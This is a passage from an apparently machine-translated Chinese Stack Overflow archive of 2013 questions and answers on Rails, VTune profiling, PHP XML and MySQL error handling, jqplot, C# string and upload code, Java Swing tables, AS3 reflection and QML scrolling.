<% end %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:25:56.303

我可能是错的，但这只是呈现一个模板，所以你应该在你的视图文件夹中寻找'letterhead_link'（文件名可能以'_'开头）。我敢打赌，超链接是内置的，你应该在那里更改它。

# ruby-on-rails - 未定义方法 `new' Netzke 入门教程

> ID：15244486
> 
> 赞同：0
> 
> 时间：2013-03-06T10:15:08.827
> 
> 标签：ruby-on-rails, methods, undefined, netzke

我按照[Netzke 的入门教程进行操作](http://writelesscode.com/blog/2012/10/20/extjs-rails-crud-application-in-7-minutes/)，但是当页面显示网格时，出现错误：

Welcome#index 中的 NoMethodError

任务的未定义方法“新”：模块

提取的源代码（在第 1 行附近）：

1: <%= netzke:tasks, height: 400 %>

我在教程中给出了完全相同的代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:28:57.077

你`bundle install`在启动应用程序之前运行过吗？听起来并非所有来自 Netzke 的方法都已添加到您的应用程序包中。另外，不要忘记运行`rake db:migrate`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-25T18:45:39.290

在 routes.rb 中添加你的 netzke

```
Rails.application.routes.draw do
netzke
root to: 'users#index'
end 
```

# c++ - VTune Profiler 给出错误：“无法显示数据，没有可用于数据的视点”

> ID：15244487
> 
> 赞同：7
> 
> 时间：2013-03-06T10:15:11.297
> 
> 标签：c++, linux, intel-vtune

我想优化我在 linux 平台上用 c++ 编写的代码。为此，我正在使用 Intel VTune Performance Analyzer Profiler。当我识别**热点**时，它成功运行了我指定路径的二进制可执行文件，然后它给出了**错误：** “**数据无法显示，没有可用于数据的视点”**。

任何人都可以帮助解决这个错误。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-21T12:10:34.963

我刚刚解决了同样的问题，希望对你来说还为时不晚。

首先，您应该启用调试信息，即使用`-g`选项编译：

```
icpc -g -o output source.cpp 
```

或者

```
gcc -g -o output source.cpp 
```

如果您更喜欢 GNU 编译器。

[在这里](http://software.intel.com/en-us/forums/topic/375990)找到了另一个步骤（非平凡的）：它说至少对于 Ubuntu，您必须输入：

```
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope 
```

这个操作帮助了我，我希望它能帮助你和其他未来面临这个问题的人。

# php - 使用 PHP 删除结束标记 XML 根

> ID：15244491
> 
> 赞同：0
> 
> 时间：2013-03-06T10:15:15.870
> 
> 标签：php, xml, removechild

我想删除 XML 文件的结束标记。
目前我正在使用 simplexml 加载文件。
我查看了 removeChild 但没有找到一个很好的例子来说明有人使用它来删除根的结束标记。

我目前有：

```
<root>
    <tag>
        <info1>Some info</info1>
        <info2>Some info</info2>
    </tag>
</root> 
```

会成为：

```
<root>
    <tag>
        <info1>Some info</info1>
        <info2>Some info</info2>
    </tag> 
```

我想做到这一点没有太多困难，有人知道怎么做吗？

编辑：我已经解决了这个问题，如评论中所述。正如我应该在我的问题中所说的那样，不需要使用 simpleXML。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:42:35.097

实际上，像 SimpleXML 这样的 XML 解析器无法创建无效的 XML，因此这不是一个选项。

然而，这显然是最后一行。因此，您可以搜索倒数第二个行分隔符并将末端切掉。那应该很容易做到。当您编写 SimpleXML 时，当您将 XML 作为字符串返回时，行分隔符是`"\xA"`（对于 US-ASCII/ISO-8859-1/UTF-8 编码的 XML 文件，通常是这种情况）：

```
$xml  = $simpleXml->asXML();
$last = strrpos($xml, "\xA", -2);
if ($last === false) {
    throw new UnexpectedValueException('Can not find beginning of last line.');
}
echo substr($xml, 0, $last), "\n"; 
```

[演示](http://eval.in/private/93811682699c15)

严格来说，这并不是写得很好，但是可能只适合您的情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T12:04:52.903

显然您想将数据添加到现有的 simplexml-object 中？保持数据有效的其他方法：

1.  使用 simplexml 的添加方法。

2.  使用循环从 simplexml 读取并使用 xmlwriter 写入新文件，在发送关闭根元素的命令之前添加新的 xml 数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T14:03:49.867

我通过更改读取文件的方法并将其作为文本而不是 simpleXML 对象来解决它。之后，我只需使用 str_replace 删除标签并添加新内容。（我知道不完美，但按预期工作）

# jquery - 如何使用 jqplot 条形图隐藏标签并在荧光笔中显示值

> ID：15244497
> 
> 赞同：1
> 
> 时间：2013-03-06T10:15:39.727
> 
> 标签：jquery, jqplot

当您将鼠标悬停在相关条形上时，我试图隐藏所有标签并仅在 jqplot 中显示条形图的 x 和 y 值。我已经能够摆脱 y 轴标签，但无法正确摆脱 x 轴标签。此外，x 轴的荧光笔中的值正在转换为整数，而不是包含文本值。有任何想法吗？

这是html：

```
 <html>
<head>
<!--[if lt IE 9]><script language="javascript" type="text/javascript"
src="/static/jqplot/excanvas.js"></script><![endif]-->
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/jquery-1.5.1.min.js"></script>
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/jquery.jqplot.min.js"></script>
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/plugins/jqplot.highlighter.min.js"></script>
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/plugins/jqplot.cursor.min.js"></script>
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/plugins/jqplot.barRenderer.min.js"></script>
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/plugins/jqplot.categoryAxisRenderer.min.js"></script>
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/plugins/jqplot.canvasAxisTickRenderer.min.js"></script>
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/plugins/jqplot.canvasAxisLabelRenderer.min.js"></script>
<script language="javascript" type="text/javascript" src="http://www.jqplot.com/src/plugins/jqplot.canvasTextRenderer.min.js"></script>
<link rel="stylesheet" type="text/css" href="http://www.jqplot.com/src/jquery.jqplot.min.css" />
</head>
<div id="numbertimeschart" style="width: 800px; height=600px"></div>
<script type="text/javascript">
$.jqplot('numbertimeschart',  [[['Nov 10, 2012, 02:22PM, number 6', 123.70500016212463], ['Nov 10, 2012, 02:22PM, number 5', 121.24499988555908], ['Nov 10, 2012, 02:22PM, number 4', 123.40899991989136], ['Nov 10, 2012, 02:22PM, number 3', 123.13800001144409], ['Nov 10, 2012, 02:22PM, number 2', 127.06200003623962], ['Nov 10, 2012, 01:10PM, number 9', 121.8140001296997], ['Nov 10, 2012, 01:10PM, number 8', 124.24000000953674], ['Nov 10, 2012, 01:10PM, number 7', 122.05999994277954], ['Nov 10, 2012, 01:10PM, number 6', 124.79999995231628], ['Nov 10, 2012, 01:10PM, number 5', 123.58000016212463], ['Nov 10, 2012, 01:10PM, number 4', 124.0149998664856], ['Nov 10, 2012, 01:10PM, number 3', 124.79500007629395], ['Nov 10, 2012, 01:10PM, number 2', 126.04999995231628], ['Nov 10, 2012, 11:37AM, number 8', 120.31300020217896], ['Nov 10, 2012, 11:37AM, number 7', 123.29999995231628], ['Nov 10, 2012, 11:37AM, number 6', 122.19000005722046], ['Nov 10, 2012, 11:37AM, number 5', 121.6819999217987], ['Nov 10, 2012, 11:37AM, number 4', 122.83599996566772], ['Nov 10, 2012, 11:37AM, number 3', 124.12800002098083], ['Nov 10, 2012, 11:37AM, number 2', 127.18899989128113]]],{     
    seriesDefaults:{
        renderer:$.jqplot.BarRenderer,
    },
    series:[
        {
            label: 'Most recent 20 numbers for Test',
            color: '#fa554f',
            markerOptions: {
                show: false,
            },
        },
    ],
    grid:{
        background: "#FFFFFF",
        gridLineColor: "#222222",
        borderColor: "#323232",
        borderWidth: 1.0,
    },
    axesDefaults: {
        pad: 0,
        showTicks: false,
        showTickMarks: false,
    },
    axes:{
        xaxis:{
            renderer: $.jqplot.CategoryAxisRenderer,
            rendererOptions: {
                tickRenderer: $.jqplot.AxisTickRenderer,
                tickOptions: {
                    show: false,
                    showLabel: false,
                    formatString: '%s',
                },
            }
        },
        yaxis:{
            tickOptions: {
                formatString: '%.2f',
            }
        }
    },
    highlighter: {
        show: true,
        sizeAdjust: 0,
        tooltipLocation: 'ne',
    },
    legend:{
        show: true,
        location: 'nw',
    },
    cursor:{
        show: false, 
    }
});
</script>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-19T03:45:05.700

荧光笔：{显示：true，sizeAdjust：7.5，tooltipAxes：'y'，}，

//////////////

tooltipAxes: 'both', // 在工具提示中显示哪个轴值，x、y 或两者。

# php - Kohana - 使用带车把的kostache

> ID：15244498
> 
> 赞同：0
> 
> 时间：2013-03-06T10:15:40.320
> 
> 标签：php, kohana, kostache

我在 KO 3.2 中使用 kostache 模块 - 查看类、模板，一切都基于 php。安装handlebars.js 可以，甚至推荐吗？这可以与kostache一起正常工作吗？

如果它不是用 javascript 编写的，我会立即执行此操作 - 我不确定这将如何工作，那些在没有打开 js 的情况下查看我的网站的人呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:34:59.180

如果您正在寻找 JS 模板解决方案，那么[http://handlebarsjs.com/](http://handlebarsjs.com/)是一个很好的解决方案。没有理由这不适用于[kostache](https://github.com/zombor/KOstache)。

我不确定我是否理解你的第二段。这是一个JS模板解决方案，所以它是用JS编写的。如果用户在他们的浏览器中禁用了 JS，那么模板将无法工作，但首先生成它们的 JS 也不会。

**编辑：** 在我看来，您在这里也可能有些困惑。Kostache 是一个服务器端模板引擎，可让您在视图中嵌入 PHP 逻辑。handlerbars.js 是一个客户端模板引擎，让您无需进行 DOM 操作来更新内容。

# c# - 得到字符串 "AA, BB, CC" 想要 "'AA', 'BB', 'CC''" - 我能做得更聪明吗？

> ID：15244501
> 
> 赞同：1
> 
> 时间：2013-03-06T10:15:46.710
> 
> 标签：c#, string

我知道我可以这样做：

```
 string input = "AA,BB,CC";
        string output = "";
        foreach (var item in input.Split(','))
        {
            output += string.Format("'{0}',", item);
        };
        output =output.TrimEnd(',');

        Assert.AreEqual("'AA','BB','CC'", output); 
```

但可能有更聪明、更快的方法来做到这一点。

感谢您的任何想法。

拉尔西

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-06T10:24:58.080

不知道这是否会更慢但更短：

```
string output = "'" + input.Replace(",", "','") + "'"; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:19:02.540

我不确定它是否会比您拥有的代码更快，但您可以使用 LINQ 并编写如下内容：

```
string output = String.Join(",",
    input.Split(',').Select(token => "'" + token + "'")); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T10:19:27.507

```
output = String.Join(",", input.Split(',').Select(s => "'" + s + "'")); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-06T10:18:33.360

```
output = String.Join(",", input.Split(',').Select(s => "'" + s + "'")); 
```

# java - JTable和JComboBox的组合使用

> ID：15244502
> 
> 赞同：0
> 
> 时间：2013-03-06T10:15:47.150
> 
> 标签：java, swing, jtable, jcombobox

我正在尝试制作一个 JTable，它在一个单元格中有一个 JComboBox。我知道我可以使用单元编辑器，但诀窍是我希望每行的组合框中有不同的信息。表中的每一行代表一个对象，在该对象上有一个数组列表，它是我想要在组合框中的那个数组列表的内容。到目前为止，这是我的思考过程。

```
table = new JTable(tableModel);
tableModel = new DefaultTableModel();
forestTable.setModel(tableModelForest);
tmpColum = forestTable.getColumnModel().getColumn(5);
tmpColum.setCellEditor(new DefaultCellEditor(comboBox));
comboBox = new JComboBox<Tree> ();
comboBox.setEditable(false); 
```

现在，当我稍后调用该方法时（通过按下按钮），我想在第 5 列中插入一个具有唯一组合框的新行，但我不知道该怎么做。我试过了。

```
public void fillTable(String text){
    tableModel.insertRow(tableModel.getRowCount(), "" } );
    tableModel.fireTableRowsInserted(
    tableModel.getRowCount(),
    tableModel.getRowCount());

    comboBox.addItem(text); 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:39:45.133

仍然合适的方法是使用单元格编辑器。

```
tmpColum.setCellEditor(new DefaultCellEditor(comboBox) {
    @Override
    public Component getTableCellEditorComponent(JTable table,
                                         Object value,
                                         boolean isSelected,
                                         int row,
                                         int column) {
        JComboBox comboBox = (JComboBox)super.getTableCellEditorComponent(
            table, value, isSelected, row, column);
        // stuff the combobox with values and selection.
        ComboBoxModel cbmodel = getMyCBModel(row); // Or (ComboBoxModel)value
        comboBox.setModel(cbmodel);
        // Or:
        if (value == null)
            comboBox.setSelectedIndex(-1);
        else
            comboBox.setSelectedItem(value);
        return comboBox;
    }
}); 
```

# php - 更新jquery上动态textarea的高度宽度和样式可拖动和调整大小

> ID：15244510
> 
> 赞同：0
> 
> 时间：2013-03-06T10:16:07.950
> 
> 标签：php, javascript, jquery, html

我有一个带有按钮的页面，该按钮允许用户向页面添加动态文本区域，然后使用 jquery 可拖动和可调整大小，他们可以移动和调整文本区域的大小。

我遇到的问题是当我试图通过 $_POST 将高度宽度和位置传递给 php 时。

如果用户在他/她拖动之前先调整大小，则该代码效果很好。

但如果用户先拖动，则他/她无法调整大小，只能发布位置和内容。

如果用户不拖动或调整大小，则仅发布 textarea 内容。

如何将动态创建的文本区域的位置和大小传递给 php.ini

我知道我需要有可更新的高度宽度和位置，但我的 JS 知识并没有延伸很远，因为我对 JS 相当陌生，所以非常感谢任何帮助。

这是我的代码：

```
<!DOCTYPE html>
<html>
<meta charset="utf-8" />
<?
if($_SERVER['REQUEST_METHOD'] == "POST")  {
   for($i=0; $i<count($_POST["textarea"]);$i++) {
    echo "text=".$_POST["textarea"][$i]."<br>";
    echo "left=".$_POST["left"][$i]."<br>";
    echo "top=".$_POST["top"][$i]."<br>";
    echo "height=".$_POST["height"][$i]."<br>";
    echo "width=".$_POST["width"][$i]."<br><br>";
   }
}
?>
<head>
<style>
  body{background-color:#ccc;}
  .dragbox{position:absolute;top:20px;width:320px; height:0;padding: 0.0em; margin:25px; border:0;cursor:move; z-index:1;display: block; }
  .textarea1{ width: 300px; height: 300px; padding: 0.5em;}
  #handle{
      display: block; 
      height: 16px; 
      width: 100px; 
      background-color: red;
      position: relative;
      top:10px;
      font-size:10px;
      }
</style>
<link rel="stylesheet" href="http://code.jquery.com/ui/1.10.1/themes/base/jquery-ui.css" />  
<script src="http://code.jquery.com/jquery-1.9.1.js"></script>   
<script src="http://code.jquery.com/ui/1.10.1/jquery-ui.js"></script>  
</head>

<body>
<form id="frmMain" name="frmMain" enctype="multipart/form-data" action="dynamic_div2.php" method="post">
<script>        
var i=0;    
var p=75;   
function creatediv1(id)
{
    id=id+i;
    var xp=xp+i;
    var newdiv = document.createElement('div');
    newdiv.setAttribute('id', id);
    newdiv.setAttribute('class', 'dragbox');
    newdiv.setAttribute('contenteditable','true');
    newdiv.style.position = "relative";
    newdiv.style.top = p;
    newdiv.style.cursor='move';
    newdiv.innerHTML = "<div id='handle'>Drag me into position</div></div><br><textarea id="+i +" name='textarea["+i +"]' class='textarea1' width='300' style='overflow-y: auto;background-color:transparent;border: 2px dashed #000; '>some text here</textarea>";

    document.getElementById("frmMain").appendChild(newdiv);
    $(function()
    {
     $("#"+i).draggable({handle:"#handle"});  
        $("#"+i).resizable(
        {
            stop: function(event, ui)
            {
                var width = ui.size.width;
                var height = ui.size.height;
                alert("width="+width+"height="+height);
                ValProportions(width,height);           
            }
        });

        $( "#"+id ).draggable(
        {
            stop: function(event, ui)
            {
                Stoppos = $(this).position();
               $("div#stop").text("STOP: \nLeft: "+ Stoppos.left + "\nTop: " + Stoppos.top);
                    alert("left="+Stoppos.left+"top="+Stoppos.top);
                ValPostion(Stoppos.left,Stoppos.top);   
            }
        }); 

    });  

    function ValProportions(defaultwidth, defaultheight)  { 
        newdiv.innerHTML=newdiv.innerHTML+"<br><input type='hidden' value='"+defaultwidth+"' name='width[]'><br><input type='hidden' value='"+defaultheight+"' name='height[]'>";               
        }
    function ValPostion(defaultleft,defaulttop)  {  
        newdiv.innerHTML=newdiv.innerHTML+"<br><input type='hidden' value='"+defaultleft+"' name='left[]'><br><input type='hidden' value='"+defaulttop+"' name='top[]'>";           
        }
    i++;
    p=p+25; 
}
</script>
<input id="btn1" type="button" value="Add New textbox" onclick="creatediv1('draggable');" />      
<input type="submit" value="Submit"  >
</form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:14:18.110

您在那里所做的是每次拖动/调整框大小时创建新的隐藏文本字段，因此该值不会正确传递。通过一些修改，我让它工作，但我不确定这是否是你的意思。

```
<!DOCTYPE html>
<html>
<meta charset="utf-8" />
<?
if($_SERVER['REQUEST_METHOD'] == "POST")  {
   for($i=0; $i<count($_POST["textarea"]);$i++) {
    echo "text=".$_POST["textarea"][$i]."<br>";
    echo "left=".$_POST["left"][$i]."<br>";
    echo "top=".$_POST["top"][$i]."<br>";
    echo "height=".$_POST["height"][$i]."<br>";
    echo "width=".$_POST["width"][$i]."<br><br>";
   }
}
?>
<head>
<style>
  body{background-color:#ccc;}
  .dragbox{position:absolute;top:20px;width:320px; height:0;padding: 0.0em; margin:25px; border:0;cursor:move; z-index:1;display: block; }
  .textarea1{ width: 300px; height: 300px; padding: 0.5em;}
  #handle{
      display: block; 
      height: 16px; 
      width: 100px; 
      background-color: red;
      position: relative;
      top:10px;
      font-size:10px;
      }
</style>
<link rel="stylesheet" href="http://code.jquery.com/ui/1.10.1/themes/base/jquery-ui.css" />  
<script src="http://code.jquery.com/jquery-1.9.1.js"></script>   
<script src="http://code.jquery.com/ui/1.10.1/jquery-ui.js"></script>  
</head>

<body>
<form id="frmMain" name="frmMain" enctype="multipart/form-data" action="drag.php" method="post">
<script>        
var i=0;    
var p=75;   
function creatediv1(id)
{
    id=id+i;
    var xp=xp+i;
    var newdiv = document.createElement('div');
    newdiv.setAttribute('id', id);
    newdiv.setAttribute('class', 'dragbox');
    newdiv.setAttribute('contenteditable','true');
    newdiv.setAttribute('iterate',i);
    newdiv.style.position = "relative";
    newdiv.style.top = p;
    newdiv.style.cursor='move';
    newdiv.innerHTML = "<div id='handle'>Drag me into position</div></div><br><textarea id="+i +" name='textarea["+i +"]' class='textarea1' width='300' style='overflow-y: auto;background-color:transparent;border: 2px dashed #000; '>some text here</textarea>";
    newdiv.innerHTML=newdiv.innerHTML+"<br><input type='hidden' value='300' name='width["+i+"]' id='width"+i+"'><br><input type='hidden' value='300' name='height["+i+"]' id='height"+i+"'>";               
    newdiv.innerHTML=newdiv.innerHTML+"<br><input type='hidden' value='0' name='left["+i+"]' id='left"+i+"'><br><input type='hidden' value='0' name='top["+i+"]' id='top"+i+"'>";           

    document.getElementById("frmMain").appendChild(newdiv);
    $(function()
    {
     $("#"+i).draggable({handle:"#handle"});  
        $("#"+i).resizable(
        {
            stop: function(event, ui)
            {
                var width = ui.size.width;
                var height = ui.size.height;
                alert("width="+width+"height="+height);
                ValProportions(width,height,ui.element.context.id);           
            }
        });

        $( "#"+id ).draggable(
        {
            stop: function(event, ui)
            {
                Stoppos = $(this).position();
               $("div#stop").text("STOP: \nLeft: "+ Stoppos.left + "\nTop: " + Stoppos.top);
                    alert("left="+Stoppos.left+"top="+Stoppos.top);
                ValPostion(Stoppos.left,Stoppos.top,$(this).attr('iterate'));   
            }
        }); 

    });  

    function ValProportions(defaultwidth, defaultheight,id)  { 
        $('#width'+id).val(defaultwidth);
        $('#height'+id).val(defaultheight);
        }
    function ValPostion(defaultleft,defaulttop,id)  {  
        $('#left'+id).val(defaultleft);
        $('#top'+id).val(defaulttop);
        }
    i++;
    p=p+25; 
}
</script>
<input id="btn1" type="button" value="Add New textbox" onclick="creatediv1('draggable');" />      
<input type="submit" value="Submit"  >
</form>
</body>
</html> 
```

# php - 添加html内容到mysql死机错误？

> ID：15244513
> 
> 赞同：-2
> 
> 时间：2013-03-06T10:16:11.937
> 
> 标签：php, html, mysql

我想添加 html 内容来代替 mysql 错误，所以当我得到一个只有黑色背景和文本“错误”的 mysql 错误时，而不是失败。

```
mysql_query($query) or die ('error'); 
```

我希望它显示这个 html 内容：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <title></title>

    <link rel="stylesheet" type="text/css" href="css/style.css" media="all" />

</head>
<body>

<div id="container">
    <h1>REGISTRATION WAS UNSUCCESFULL</h1><br/><br/><br/><br/>
    <div class="textarea">
        <h3>Whoop! Good News we've successfully receieved your registration. So now what we've done, is sent you an email. In this email you will be guided through the final stage of account set-up.<br/><br/>Keep an eye on your inbox and follow the instructions. We hope to see you real soon ;-)</h3>
    </div>
        <div class="man_reg"><img src="../assets/img/help_support/man.png" alt="" width="210" height="214" /></div></div>
    <div id="progress_bar">
        <div id="progress"></div>
        <div id="progress_text">Registration Completed</div>
    </div>

    <style>
    .textarea{
        padding-left:55px;
        padding-right:55px;
        text-align:center;
    }
    .man_reg{
        margin-top:54px;
        margin-left:450px;
    }

    </style>    
</body>
</html> 
```

我不只是在 mysql 的括号内插入 html 内容还是会出错？

像这样：

```
mysql_query($query) or die ('HTML CONTENT HERE!'); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:19:20.470

您不必使用`or die()`. `mysql_query` **失败返回** `false`，所以使用它：

```
$result = mysql_query(...);

if (!$result) {

    // do anything necessary to display a page here,
    // maybe include() an external file

} else {

    ...

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:21:40.163

您基本上只是将内容放在括号内，但更优雅的方式是拥有一个单独的`error.html`模板并对其进行`include()`ing。这样，您的代码就不会被大量标记污染。

error.html（简体）：

```
<html><head></head><body><?php echo $error; ?></body></html> 
```

PHP代码：

```
$result = mysql_query(....);

if (!$result)
 { 
   $error = mysql_error();
   include "error.html";
   die(); 
 } 
```

请注意，在生产环境中显示错误是一种不好的风格。您可能希望在开发时显示确切的错误消息，并在项目公开时显示通用的“发生错误”页面。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T10:20:26.020

更好的解决方案是创建一个包含该内容的错误页面，然后使用以下代码将用户重定向到该页面：

```
$res = mysql_query($query);
if (!$res) {
    header('Location: http://yourdomain.com/error.html');
    die(); // just to end up the execution
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-06T10:17:47.877

只需将您的 html 内容存储在一个变量中并使用该变量`die`

```
$error = "<html>your html content</html>";

mysql_query($query) or die ($error); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-06T10:22:30.093

你也可以为此使用一个函数

```
function dieerr() {
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
<title></title>

<link rel="stylesheet" type="text/css" href="css/style.css" media="all" />

</head>
<body>

<div id="container">
<h1>REGISTRATION WAS UNSUCCESFULL</h1><br/><br/><br/><br/>
<div class="textarea">
    <h3>Whoop! Good News we\'ve successfully receieved your registration. So now what we\'ve done, is sent you an email. In this email you will be guided through the final stage of account set-up.<br/><br/>Keep an eye on your inbox and follow the instructions. We hope to see you real soon ;-)</h3>
</div>
    <div class="man_reg"><img src="../assets/img/help_support/man.png" alt="" width="210" height="214" /></div></div>
<div id="progress_bar">
    <div id="progress"></div>
    <div id="progress_text">Registration Completed</div>
</div>

<style>
.textarea{
    padding-left:55px;
    padding-right:55px;
    text-align:center;
}
.man_reg{
    margin-top:54px;
    margin-left:450px;
}

</style>    
</body>
</html>';
exit;
} 
```

如果你有这个然后像这样使用它：

```
mysql_query($query) or dieerr(); 
```

# c# - 将 Windows 应用程序中的文件上传到 Web 服务器

> ID：15244519
> 
> 赞同：0
> 
> 时间：2013-03-06T10:16:26.200
> 
> 标签：c#, asp.net

我想使用我的 Windows 应用程序将多个图像文件上传到 Web 服务器。这是我的代码

```
 public void UploadMyFile(string URL, string localFilePath)
    {
      HttpWebRequest req=(HttpWebRequest)WebRequest.Create(URL);                     
      req.Method = "PUT";
      req.AllowWriteStreamBuffering = true;

      // Retrieve request stream and wrap in StreamWriter
      Stream reqStream = req.GetRequestStream();
      StreamWriter wrtr = new StreamWriter(reqStream);

      // Open the local file
      StreamReader rdr = new StreamReader(localFilePath);

      // loop through the local file reading each line 
      //  and writing to the request stream buffer
      string inLine = rdr.ReadLine();
      while (inLine != null)
      {
        wrtr.WriteLine(inLine);
        inLine = rdr.ReadLine();
      }

      rdr.Close();
      wrtr.Close();

      req.GetResponse();
    } 
```

我参考了以下链接 [http://msdn.microsoft.com/en-us/library/aa446517.aspx](http://msdn.microsoft.com/en-us/library/aa446517.aspx)

我收到异常远程服务器返回了意外响应：（405）方法不允许。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:29:46.327

当这些是图像文件时，您为什么要按行读取和写入？您应该以字节块的形式进行读写。

```
public void UploadMyFile(string URL, string localFilePath)
{
      HttpWebRequest req=(HttpWebRequest)WebRequest.Create(URL);

      req.Method = "PUT";
      req.ContentType = "application/octet-stream";

      using (Stream reqStream = req.GetRequestStream()) {

          using (Stream inStream = new FileStream(localFilePath,FileMode.Open,FileAccess.Read,FileShare.Read)) {
              inStream.CopyTo(reqStream,4096);
          }

          reqStream.Flush();
      }

      HttpWebResponse response = (HttpWebReponse)req.GetResponse();
} 
```

您也可以尝试更简单的`WebClient`方法：

```
public void UploadMyFile(string url, string localFilePath)
{
    using(WebClient client = new WebClient()) {
        client.UploadFile(url,localFilePath);
    }
} 
```

# ide - AS3：IDE 如何提取类继承信息？

> ID：15244526
> 
> 赞同：1
> 
> 时间：2013-03-06T10:16:41.033
> 
> 标签：ide, actionscript-3

我想知道最简单的方法是什么——*在我自己的自定义代码中*——一个完整的 AS3 继承树和每个类的继承成员：

*   搜索每个 SWC 的 catalog.xml，然后找到目录中列出的每个适当的类文件，然后解析它？

*   还是其他更简单的方法？

换句话说，我需要完全了解 AS3 继承链（所有核心和自定义类），包括属于可能出现在子类中的超类的公共和受保护成员。此信息将插入我正在编写的语言转换器（AS3-> 其他语言）。

我想知道如何。FlashDevelop 或 FlashBuilder (Eclipse) 执行此操作。我查看了每个 .SWC 中出现的 catalog.xml 文件，虽然这提供了对继承链的一些了解，但它没有说明 IDE 如何提取信息，如自动完成中使用的继承成员。

这些信息应该从哪里提取？...记住 FD（例如）是用 C# 编写的，因此`describeType`可能不是一个选项。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T16:39:37.107

要访问完整的依赖关系图，包括私有和内部 API，您必须使用字节码自省 - 解析类（文本）文件不会产生任何关于从 .SWC 库中导入的类的信息。有关 ActionScript 字节码的更多信息，请查看[AVM2 规范](http://www.adobe.com/content/dam/Adobe/en/devnet/actionscript/articles/avm2overview.pdf)。

如果您打算在 AS3 中工作，您可以在运行时访问任何类的类型信息，使用[`describeType()`](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/utils/package.html). 然而，它的范围是有限的（只包括公共成员），而且它对性能的影响很大，所以你必须实现某种缓存机制，也许还需要调整你的 XML 解析。

如果您想省去麻烦，请查看[as3commons-reflect](http://as3commons.org/as3-commons-reflect/index.html)。它提供了以上所有功能，以及一个非常方便的 API。每当您在不寻常的罕见场合使用反射时，我强烈推荐它 - 您将节省大量时间和精力来编写其他人已经写过的内容;)。

此外，如果您需要访问私有和内部成员，或者如果您想在运行时操作类，则有[as3commons-bytecode](http://www.as3commons.org/as3-commons-bytecode/index.html)，它适用于加载类的实际字节码，并允许各种巫术和黑魔法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:24:26.577

我真的希望避免链接到软件，但这似乎正是您要寻找的。

[AS3 类图查看器](http://www.softpedia.com/get/Others/Home-Education/AS3-Class-Diagram-Viewer.shtml)

![在此处输入图像描述](../Images/70bdf1031927d1cd04cc9d2293d290e3.png)

除此之外，文档似乎总是组织得很好，可以看到类层次结构。

您还可以获得离线版本...[我在哪里可以下载 AS3 flash 平台完整文档？](https://stackoverflow.com/questions/3178740/where-can-i-download-as3-flash-platform-full-documentation)

# qt - 修复 QML 中的水平滚动

> ID：15244527
> 
> 赞同：2
> 
> 时间：2013-03-06T10:16:41.653
> 
> 标签：qt, scroll, scrollbar, qml

我想用于[Scroll Bar Example](http://qt-project.org/doc/qt-4.8/declarative-ui-components-scrollbar.html)。

我尝试将此示例用于个人应用程序。我的 main.qml 文件是这样的：

```
 Flickable {
         id: view
         anchors.fill: parent
         contentWidth: bobol.width
         contentHeight: bobol.height
    Column {
        id : bobol
        Rectangle {
            width: 400
            height: 100
            color: 'red'
  MouseArea {
        id: sideButtonMouseArea
        anchors.fill: parent
        hoverEnabled: true
        onClicked: {      
            parent.color = '#4872E8'
        }}}
       Rectangle {
                        width: 200
                        height: 1000
                    }
}   
 states: State {
             name: "ShowBars"
             when: view.movingVertically 
             PropertyChanges { target: verticalScrollBar; opacity: 1 }}
         transitions: Transition {
             NumberAnimation { properties: "opacity"; duration: 400 }}}
     ScrollBar {
         id: verticalScrollBar
         width: 12; height: view.height-12
         anchors.right: view.right
         opacity: 10
         orientation: Qt.Vertical
         position: view.visibleArea.yPosition
         pageSize: view.visibleArea.heightRatio} 
```

我想在这个例子中修复水平滚动？我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-18T08:04:41.643

您是否正在寻找这样的东西：

```
import QtQuick 1.0
Item{
    Flickable {
    id: view
    anchors.fill: parent
    contentWidth: bobol.width
